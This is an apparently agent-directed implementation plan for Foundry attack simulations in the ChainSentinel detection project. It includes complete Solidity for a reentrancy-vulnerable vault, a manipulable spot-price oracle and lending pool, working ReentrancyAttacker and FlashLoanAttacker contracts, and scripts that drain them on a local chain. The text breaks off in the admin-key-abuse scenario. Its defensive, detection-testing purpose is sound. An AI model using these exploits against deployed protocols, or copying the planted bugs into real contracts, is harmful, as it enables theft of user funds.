# ChainSentinel Foundry Simulations — Implementation Plan (Plan 5 of 6)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Foundry simulation project with 4 attack scenarios (reentrancy-drain, flash-loan-oracle, admin-key-abuse, mev-sandwich). Each scenario includes victim protocol contracts, attacker contracts, normal activity generators, and RunAll scripts. Each scenario produces a `client/` handover folder with ABIs + manifest.json simulating what a real client would provide to SISA.

**Architecture:** Foundry project at `simulations/` with shared contracts (MockERC20, MockWETH, UserActivity) and 4 scenario folders. Each scenario has 3 phases: deploy victim protocol, generate normal activity, execute attack. Scripts run against Anvil (localhost:8545). The client handover folder contains only what ChainSentinel sees — ABIs and a manifest mapping addresses to contracts.

**Tech Stack:** Foundry (forge, anvil), Solidity 0.8.24+

**Spec reference:** `docs/superpowers/specs/2026-04-12-chainsentinel-design.md` section 13

**Depends on:** None (independent, but scenarios are tested by Plans 1-3)

---

## File Structure

```
simulations/
├── foundry.toml
├── lib/                              ← forge install dependencies
├── shared/
│   └── contracts/
│       ├── MockERC20.sol
│       ├── MockWETH.sol
│       └── UserActivity.sol
└── scenarios/
    ├── reentrancy-drain/
    │   ├── client/
    │   │   ├── abis/
    │   │   │   ├── VulnerableVault.json
    │   │   │   └── MockERC20.json
    │   │   └── manifest.json
    │   ├── src/
    │   │   ├── victim/
    │   │   │   └── VulnerableVault.sol
    │   │   ├── attacker/
    │   │   │   └── ReentrancyAttacker.sol
    │   │   └── activity/
    │   │       └── NormalUsers.sol
    │   └── script/
    │       ├── 01_DeployProtocol.s.sol
    │       ├── 02_NormalActivity.s.sol
    │       ├── 03_ExecuteAttack.s.sol
    │       └── RunAll.s.sol
    ├── flash-loan-oracle/
    │   ├── client/
    │   ├── src/
    │   └── script/
    ├── admin-key-abuse/
    │   ├── client/
    │   ├── src/
    │   └── script/
    └── mev-sandwich/
        ├── client/
        ├── src/
        └── script/
```

---

### Task 1: Foundry Project Scaffolding

**Files:**
- Create: `simulations/foundry.toml`
- Create: shared contracts

- [ ] **Step 1: Create directory structure**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary
mkdir -p simulations/shared/contracts
mkdir -p simulations/scenarios/reentrancy-drain/{client/abis,src/victim,src/attacker,src/activity,script}
mkdir -p simulations/scenarios/flash-loan-oracle/{client/abis,src/victim,src/attacker,src/activity,script}
mkdir -p simulations/scenarios/admin-key-abuse/{client/abis,src/victim,src/attacker,src/activity,script}
mkdir -p simulations/scenarios/mev-sandwich/{client/abis,src/victim,src/attacker,src/activity,script}
```

- [ ] **Step 2: Create foundry.toml**

`simulations/foundry.toml`:

```toml
[profile.default]
src = "."
out = "out"
libs = ["lib"]
solc_version = "0.8.24"
optimizer = true
optimizer_runs = 200
evm_version = "cancun"
ffi = false
via_ir = false

[rpc_endpoints]
anvil = "http://127.0.0.1:8545"
```

- [ ] **Step 3: Install OpenZeppelin via forge**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary/simulations
forge install OpenZeppelin/openzeppelin-contracts --no-commit
```

- [ ] **Step 4: Create MockERC20.sol**

`simulations/shared/contracts/MockERC20.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
```

- [ ] **Step 5: Create MockWETH.sol**

`simulations/shared/contracts/MockWETH.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
        emit Transfer(address(0), msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external {
        require(balanceOf[msg.sender] >= wad, "Insufficient WETH");
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
        emit Transfer(msg.sender, address(0), wad);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
}
```

- [ ] **Step 6: Create UserActivity.sol**

`simulations/shared/contracts/UserActivity.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title UserActivity
 * @notice Generates realistic normal traffic on a protocol.
 *         Called during Phase 2 of each scenario to create noise
 *         that ChainSentinel must filter through.
 */
contract UserActivity {
    event UserDeposit(address indexed user, uint256 amount);
    event UserWithdraw(address indexed user, uint256 amount);
    event UserTransfer(address indexed from, address indexed to, uint256 amount);

    /// @notice Simulate a normal user depositing into a vault/pool
    function simulateDeposit(address vault, uint256 amount) external payable {
        (bool success,) = vault.call{value: amount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");
        emit UserDeposit(msg.sender, amount);
    }

    /// @notice Simulate a normal user withdrawing from a vault/pool
    function simulateWithdraw(address vault, uint256 amount) external {
        (bool success,) = vault.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success, "Withdraw failed");
        emit UserWithdraw(msg.sender, amount);
    }

    /// @notice Simulate ETH transfers between users
    function simulateTransfer(address payable to) external payable {
        to.transfer(msg.value);
        emit UserTransfer(msg.sender, to, msg.value);
    }

    receive() external payable {}
}
```

- [ ] **Step 7: Compile shared contracts**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary/simulations
forge build --root . --contracts shared/contracts
```

- [ ] **Step 8: Commit**

```bash
git add simulations/foundry.toml simulations/shared/
git commit -m "feat: Foundry simulation scaffolding with MockERC20, MockWETH, UserActivity"
```

---

### Task 2: Reentrancy Drain Scenario

**Files:**
- Create: victim, attacker, activity contracts
- Create: deployment and execution scripts
- Create: client handover folder

- [ ] **Step 1: Create VulnerableVault.sol**

`simulations/scenarios/reentrancy-drain/src/victim/VulnerableVault.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title VulnerableVault
 * @notice ETH vault with a classic reentrancy vulnerability.
 *         The withdraw function sends ETH before updating state.
 *         This is what the client deploys — they don't know about the bug.
 */
contract VulnerableVault {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Must deposit ETH");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // BUG: sends ETH before updating state
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        emit Withdraw(msg.sender, amount);
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}
```

- [ ] **Step 2: Create ReentrancyAttacker.sol**

`simulations/scenarios/reentrancy-drain/src/attacker/ReentrancyAttacker.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title ReentrancyAttacker
 * @notice Exploits VulnerableVault via recursive withdraw.
 *         ChainSentinel never sees this source code — it detects the
 *         attack purely from on-chain execution traces.
 */
contract ReentrancyAttacker {
    IVault public vault;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentrancyCount;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        attackAmount = msg.value;

        // Deposit seed amount
        vault.deposit{value: msg.value}();

        // Trigger recursive withdraw
        vault.withdraw(msg.value);
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        reentrancyCount++;
        // Re-enter vault if it still has funds
        if (address(vault).balance >= attackAmount && reentrancyCount < 10) {
            vault.withdraw(attackAmount);
        }
    }
}
```

- [ ] **Step 3: Create NormalUsers.sol**

`simulations/scenarios/reentrancy-drain/src/activity/NormalUsers.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVaultActivity {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title NormalUsers
 * @notice Simulates normal user behavior on VulnerableVault.
 *         Multiple users deposit and some withdraw small amounts.
 */
contract NormalUsers {
    IVaultActivity public vault;

    constructor(address _vault) {
        vault = IVaultActivity(_vault);
    }

    function depositMultiple() external payable {
        uint256 perUser = msg.value / 5;
        for (uint256 i = 0; i < 5; i++) {
            vault.deposit{value: perUser}();
        }
    }

    function smallWithdraw(uint256 amount) external {
        vault.withdraw(amount);
    }

    receive() external payable {}
}
```

- [ ] **Step 4: Create deployment scripts**

`simulations/scenarios/reentrancy-drain/script/01_DeployProtocol.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/victim/VulnerableVault.sol";

contract DeployProtocol is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");
        vm.startBroadcast(deployerKey);

        VulnerableVault vault = new VulnerableVault();
        console.log("VulnerableVault deployed at:", address(vault));

        vm.stopBroadcast();
    }
}
```

`simulations/scenarios/reentrancy-drain/script/02_NormalActivity.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";

interface IVaultScript {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract NormalActivity is Script {
    function run() external {
        address vaultAddr = vm.envAddress("VAULT_ADDRESS");
        IVaultScript vault = IVaultScript(vaultAddr);

        // User 1: deposits 5 ETH
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        vault.deposit{value: 5 ether}();
        vm.stopBroadcast();

        // User 2: deposits 3 ETH
        uint256 user2Key = vm.envUint("USER2_KEY");
        vm.startBroadcast(user2Key);
        vault.deposit{value: 3 ether}();
        vm.stopBroadcast();

        // User 3: deposits 10 ETH
        uint256 user3Key = vm.envUint("USER3_KEY");
        vm.startBroadcast(user3Key);
        vault.deposit{value: 10 ether}();
        vm.stopBroadcast();

        // User 1: small withdraw of 1 ETH
        vm.startBroadcast(user1Key);
        vault.withdraw(1 ether);
        vm.stopBroadcast();

        // User 2: another deposit
        vm.startBroadcast(user2Key);
        vault.deposit{value: 2 ether}();
        vm.stopBroadcast();

        console.log("Normal activity complete. Vault should have ~19 ETH");
    }
}
```

`simulations/scenarios/reentrancy-drain/script/03_ExecuteAttack.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/attacker/ReentrancyAttacker.sol";

contract ExecuteAttack is Script {
    function run() external {
        address vaultAddr = vm.envAddress("VAULT_ADDRESS");
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");

        vm.startBroadcast(attackerKey);

        ReentrancyAttacker attacker = new ReentrancyAttacker(vaultAddr);
        console.log("Attacker deployed at:", address(attacker));

        // Attack with 1 ETH seed
        attacker.attack{value: 1 ether}();
        console.log("Attack executed. Attacker balance:", address(attacker).balance);

        // Withdraw stolen funds
        attacker.withdraw();
        console.log("Funds withdrawn to attacker EOA");

        vm.stopBroadcast();
    }
}
```

`simulations/scenarios/reentrancy-drain/script/RunAll.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/victim/VulnerableVault.sol";
import "../src/attacker/ReentrancyAttacker.sol";

contract RunAll is Script {
    function run() external {
        // Phase 1: Deploy
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");
        vm.startBroadcast(deployerKey);
        VulnerableVault vault = new VulnerableVault();
        console.log("Vault:", address(vault));
        vm.stopBroadcast();

        // Phase 2: Normal activity
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        vault.deposit{value: 5 ether}();
        vm.stopBroadcast();

        uint256 user2Key = vm.envUint("USER2_KEY");
        vm.startBroadcast(user2Key);
        vault.deposit{value: 3 ether}();
        vm.stopBroadcast();

        uint256 user3Key = vm.envUint("USER3_KEY");
        vm.startBroadcast(user3Key);
        vault.deposit{value: 10 ether}();
        vm.stopBroadcast();

        vm.startBroadcast(user1Key);
        vault.withdraw(1 ether);
        vm.stopBroadcast();

        // Phase 3: Attack
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        vm.startBroadcast(attackerKey);
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(vault));
        attacker.attack{value: 1 ether}();
        attacker.withdraw();
        console.log("Attack complete. Vault drained.");
        vm.stopBroadcast();
    }
}
```

- [ ] **Step 5: Create client handover folder**

`simulations/scenarios/reentrancy-drain/client/manifest.json`:

```json
{
  "investigation_name": "Reentrancy Drain",
  "chain_id": 31337,
  "rpc_url": "http://127.0.0.1:8545",
  "contracts": [
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "VulnerableVault",
      "role": "victim",
      "abi_file": "abis/VulnerableVault.json"
    }
  ],
  "block_range": {
    "from": "FILL_AFTER_DEPLOY",
    "to": "FILL_AFTER_DEPLOY"
  },
  "notes": "Our ETH vault was drained. We noticed all user deposits disappeared. Please investigate."
}
```

`simulations/scenarios/reentrancy-drain/client/abis/VulnerableVault.json`:

```json
[
  {
    "inputs": [],
    "name": "deposit",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [{ "name": "amount", "type": "uint256" }],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "name": "user", "type": "address" }],
    "name": "getBalance",
    "outputs": [{ "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "name": "user", "type": "address" },
      { "indexed": false, "name": "amount", "type": "uint256" }
    ],
    "name": "Deposit",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "name": "user", "type": "address" },
      { "indexed": false, "name": "amount", "type": "uint256" }
    ],
    "name": "Withdraw",
    "type": "event"
  }
]
```

- [ ] **Step 6: Compile and verify**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary/simulations
forge build --root . --contracts scenarios/reentrancy-drain/src
```

- [ ] **Step 7: Commit**

```bash
git add simulations/scenarios/reentrancy-drain/
git commit -m "feat: reentrancy-drain scenario with VulnerableVault, attacker, scripts, client handover"
```

---

### Task 3: Flash Loan Oracle Scenario

**Files:**
- Create: victim contracts (LendingPool, SimpleOracle, MockUniswapPool)
- Create: attacker contract (FlashLoanAttacker)
- Create: scripts and client handover

- [ ] **Step 1: Create SimpleOracle.sol**

`simulations/scenarios/flash-loan-oracle/src/victim/SimpleOracle.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title SimpleOracle
 * @notice A naive oracle that reads price from a DEX pool spot price.
 *         Vulnerable to flash loan manipulation.
 */
contract SimpleOracle {
    address public pool;
    address public owner;

    event PriceQueried(uint256 price, address querier);

    constructor(address _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    function getPrice() external returns (uint256) {
        (bool success, bytes memory data) = pool.call(
            abi.encodeWithSignature("getSpotPrice()")
        );
        require(success, "Price query failed");
        uint256 price = abi.decode(data, (uint256));
        emit PriceQueried(price, msg.sender);
        return price;
    }
}
```

- [ ] **Step 2: Create MockUniswapPool.sol**

`simulations/scenarios/flash-loan-oracle/src/victim/MockUniswapPool.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

/**
 * @title MockUniswapPool
 * @notice Simplified AMM pool with flash loan capability.
 *         Spot price is reserve ratio — manipulable via large swaps.
 */
contract MockUniswapPool {
    MockERC20 public tokenA;
    MockERC20 public tokenB;
    uint256 public reserveA;
    uint256 public reserveB;

    event Swap(address indexed trader, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event FlashLoan(address indexed borrower, address token, uint256 amount);
    event AddLiquidity(address indexed provider, uint256 amountA, uint256 amountB);

    constructor(address _tokenA, address _tokenB) {
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
    }

    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);
        reserveA += amountA;
        reserveB += amountB;
        emit AddLiquidity(msg.sender, amountA, amountB);
    }

    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
        if (tokenIn == address(tokenA)) {
            amountOut = (amountIn * reserveB) / (reserveA + amountIn);
            tokenA.transferFrom(msg.sender, address(this), amountIn);
            tokenB.transfer(msg.sender, amountOut);
            reserveA += amountIn;
            reserveB -= amountOut;
            emit Swap(msg.sender, address(tokenA), address(tokenB), amountIn, amountOut);
        } else {
            amountOut = (amountIn * reserveA) / (reserveB + amountIn);
            tokenB.transferFrom(msg.sender, address(this), amountIn);
            tokenA.transfer(msg.sender, amountOut);
            reserveB += amountIn;
            reserveA -= amountOut;
            emit Swap(msg.sender, address(tokenB), address(tokenA), amountIn, amountOut);
        }
    }

    function flashLoan(address token, uint256 amount, bytes calldata data) external {
        uint256 balanceBefore;
        if (token == address(tokenA)) {
            balanceBefore = tokenA.balanceOf(address(this));
            tokenA.transfer(msg.sender, amount);
        } else {
            balanceBefore = tokenB.balanceOf(address(this));
            tokenB.transfer(msg.sender, amount);
        }

        emit FlashLoan(msg.sender, token, amount);

        (bool success,) = msg.sender.call(data);
        require(success, "Flash loan callback failed");

        if (token == address(tokenA)) {
            require(tokenA.balanceOf(address(this)) >= balanceBefore, "Flash loan not repaid");
        } else {
            require(tokenB.balanceOf(address(this)) >= balanceBefore, "Flash loan not repaid");
        }
    }

    function getSpotPrice() external view returns (uint256) {
        if (reserveA == 0) return 0;
        return (reserveB * 1e18) / reserveA;
    }
}
```

- [ ] **Step 3: Create LendingPool.sol**

`simulations/scenarios/flash-loan-oracle/src/victim/LendingPool.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

interface IOracle {
    function getPrice() external returns (uint256);
}

/**
 * @title LendingPool
 * @notice Simplified lending pool that uses oracle for collateral valuation.
 *         Vulnerable because the oracle reads manipulable spot price.
 */
contract LendingPool {
    MockERC20 public collateralToken;
    MockERC20 public borrowToken;
    IOracle public oracle;
    address public owner;

    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    event CollateralDeposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);
    event Repaid(address indexed user, uint256 amount);
    event Liquidated(address indexed user, address indexed liquidator, uint256 amount);

    constructor(address _collateral, address _borrow, address _oracle) {
        collateralToken = MockERC20(_collateral);
        borrowToken = MockERC20(_borrow);
        oracle = IOracle(_oracle);
        owner = msg.sender;
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
        emit CollateralDeposited(msg.sender, amount);
    }

    function borrow(uint256 amount) external {
        uint256 price = oracle.getPrice();
        uint256 collateralValue = (collateral[msg.sender] * price) / 1e18;
        uint256 maxBorrow = (collateralValue * 80) / 100; // 80% LTV
        require(debt[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");

        debt[msg.sender] += amount;
        borrowToken.transfer(msg.sender, amount);
        emit Borrowed(msg.sender, amount);
    }

    function repay(uint256 amount) external {
        borrowToken.transferFrom(msg.sender, address(this), amount);
        debt[msg.sender] -= amount;
        emit Repaid(msg.sender, amount);
    }

    function seedLiquidity(uint256 amount) external {
        borrowToken.transferFrom(msg.sender, address(this), amount);
    }
}
```

- [ ] **Step 4: Create FlashLoanAttacker.sol**

`simulations/scenarios/flash-loan-oracle/src/attacker/FlashLoanAttacker.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

interface IPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}

interface ILending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

/**
 * @title FlashLoanAttacker
 * @notice Flash loan -> swap to manipulate pool ratio -> borrow at inflated collateral value -> profit
 */
contract FlashLoanAttacker {
    address public owner;
    IPool public pool;
    ILending public lending;
    MockERC20 public tokenA;
    MockERC20 public tokenB;

    constructor(address _pool, address _lending, address _tokenA, address _tokenB) {
        owner = msg.sender;
        pool = IPool(_pool);
        lending = ILending(_lending);
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
    }

    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "Not owner");

        // Initiate flash loan of tokenA
        bytes memory callback = abi.encodeWithSignature("onFlashLoan()");
        pool.flashLoan(address(tokenA), flashAmount, callback);
    }

    function onFlashLoan() external {
        uint256 balance = tokenA.balanceOf(address(this));

        // Step 1: Massive swap to manipulate price ratio
        tokenA.approve(address(pool), balance);
        uint256 received = pool.swap(address(tokenA), balance / 2);

        // Step 2: Deposit remaining tokenA as collateral
        uint256 collateralAmount = tokenA.balanceOf(address(this));
        tokenA.approve(address(lending), collateralAmount);
        lending.depositCollateral(collateralAmount);

        // Step 3: Borrow at inflated valuation
        lending.borrow(received / 2);

        // Step 4: Swap back to repay flash loan
        tokenB.approve(address(pool), received);
        pool.swap(address(tokenB), received);

        // Step 5: Repay flash loan (return original tokenA)
        tokenA.transfer(address(pool), balance);
    }

    function withdraw(address token) external {
        require(msg.sender == owner, "Not owner");
        MockERC20(token).transfer(owner, MockERC20(token).balanceOf(address(this)));
    }
}
```

- [ ] **Step 5: Create RunAll.s.sol for flash-loan-oracle**

`simulations/scenarios/flash-loan-oracle/script/RunAll.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../../shared/contracts/MockERC20.sol";
import "../src/victim/MockUniswapPool.sol";
import "../src/victim/SimpleOracle.sol";
import "../src/victim/LendingPool.sol";
import "../src/attacker/FlashLoanAttacker.sol";

contract RunAll is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");

        vm.startBroadcast(deployerKey);

        // Deploy tokens
        MockERC20 tokenA = new MockERC20("Token A", "TKA", 18);
        MockERC20 tokenB = new MockERC20("Token B", "TKB", 18);

        // Deploy pool and seed liquidity
        MockUniswapPool pool = new MockUniswapPool(address(tokenA), address(tokenB));
        tokenA.mint(msg.sender, 1_000_000e18);
        tokenB.mint(msg.sender, 1_000_000e18);
        tokenA.approve(address(pool), 500_000e18);
        tokenB.approve(address(pool), 500_000e18);
        pool.addLiquidity(500_000e18, 500_000e18);

        // Deploy oracle and lending
        SimpleOracle oracle = new SimpleOracle(address(pool));
        LendingPool lending = new LendingPool(address(tokenA), address(tokenB), address(oracle));
        tokenB.mint(address(lending), 100_000e18); // seed lending pool

        console.log("Pool:", address(pool));
        console.log("Oracle:", address(oracle));
        console.log("Lending:", address(lending));

        vm.stopBroadcast();

        // Normal activity
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        tokenA.mint(msg.sender, 10_000e18);
        tokenA.approve(address(pool), 1_000e18);
        pool.swap(address(tokenA), 1_000e18);
        vm.stopBroadcast();

        // Attack
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        vm.startBroadcast(attackerKey);
        FlashLoanAttacker attacker = new FlashLoanAttacker(
            address(pool), address(lending), address(tokenA), address(tokenB)
        );
        attacker.attack(400_000e18);
        console.log("Flash loan oracle attack executed");
        vm.stopBroadcast();
    }
}
```

- [ ] **Step 6: Create client handover**

`simulations/scenarios/flash-loan-oracle/client/manifest.json`:

```json
{
  "investigation_name": "Flash Loan Oracle Manipulation",
  "chain_id": 31337,
  "rpc_url": "http://127.0.0.1:8545",
  "contracts": [
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "LendingPool",
      "role": "victim",
      "abi_file": "abis/LendingPool.json"
    },
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "SimpleOracle",
      "role": "dependency",
      "abi_file": "abis/SimpleOracle.json"
    },
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "MockUniswapPool",
      "role": "dependency",
      "abi_file": "abis/MockUniswapPool.json"
    }
  ],
  "block_range": {
    "from": "FILL_AFTER_DEPLOY",
    "to": "FILL_AFTER_DEPLOY"
  },
  "notes": "Our lending pool was drained. Borrowers took out loans far exceeding their collateral value. We suspect price manipulation."
}
```

- [ ] **Step 7: Commit**

```bash
git add simulations/scenarios/flash-loan-oracle/
git commit -m "feat: flash-loan-oracle scenario with AMM pool, oracle, lending pool, attacker"
```

---

### Task 4: Admin Key Abuse Scenario

**Files:**
- Create: GovernanceToken with owner mint
- Create: attacker script that transfers ownership, mints, dumps

- [ ] **Step 1: Create GovernanceToken.sol**

`simulations/scenarios/admin-key-abuse/src/victim/GovernanceToken.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title GovernanceToken
 * @notice ERC20 governance token with owner-controlled minting.
 *         Vulnerable to private key compromise — owner can mint unlimited.
 */
contract GovernanceToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Mint(address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(string memory _name, string memory _symbol, uint256 initialSupply) {
        name = _name;
        symbol = _symbol;
        owner = msg.sender;
        _mint(msg.sender, initialSupply);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
        emit Mint(to, amount);
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
```

- [ ] **Step 2: Create SimpleDEX.sol for token dumping**

`simulations/scenarios/admin-key-abuse/src/victim/SimpleDEX.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

/**
 * @title SimpleDEX
 * @notice Minimal AMM for swapping governance token to ETH/WETH.
 */
